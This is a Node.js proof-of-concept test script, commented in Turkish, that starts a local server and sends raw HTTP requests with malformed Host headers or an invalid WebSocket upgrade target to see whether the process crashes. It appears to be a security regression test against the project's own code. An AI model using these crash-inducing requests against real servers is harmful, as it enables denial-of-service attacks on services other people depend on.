// PoC: Geçersiz Host başlığı / geçersiz istek hedefi sunucu sürecini çökertir.
// Çalıştır: node tests/security/poc-host-crash.mjs
import net from 'node:net';
import { startServer } from '../lib/server.js';

async function raw(port, text) {
  return new Promise((resolve) => {
    const s = net.connect(port, '127.0.0.1', () => s.write(text));
    let out = '';
    s.on('data', (d) => { out += d; });
    s.on('close', () => resolve(out));
    s.on('error', (e) => resolve(`ERR ${e.code}`));
    setTimeout(() => { s.destroy(); }, 1500);
  });
}

async function alive(url) {
  try { const r = await fetch(url, { signal: AbortSignal.timeout(1500) }); return r.status; } catch (e) { return `DEAD (${e.cause?.code ?? e.message})`; }
}

const cases = [
  ['HTTP isteği, Host: "a b"', 'GET / HTTP/1.1\r\nHost: a b\r\nConnection: close\r\n\r\n'],
  ['HTTP isteği, Host: "["', 'GET / HTTP/1.1\r\nHost: [\r\nConnection: close\r\n\r\n'],
  ['Upgrade isteği, hedef "http://["', 'GET http://[ HTTP/1.1\r\nHost: x\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n'],
];

for (const [label, req] of cases) {
  const srv = await startServer();
  const before = await alive(srv.url);
  await raw(srv.port, req);
  await new Promise((r) => setTimeout(r, 300));
  const after = await alive(srv.url);
  console.log(`${label}: önce=${before} sonra=${after}`);
  if (String(after).startsWith('DEAD')) console.log('  sunucu logu (son satırlar):', srv.log().split('\n').filter((l) => /Error|TypeError|code/.test(l)).slice(0, 3).join(' | '));
  await srv.stop();
}
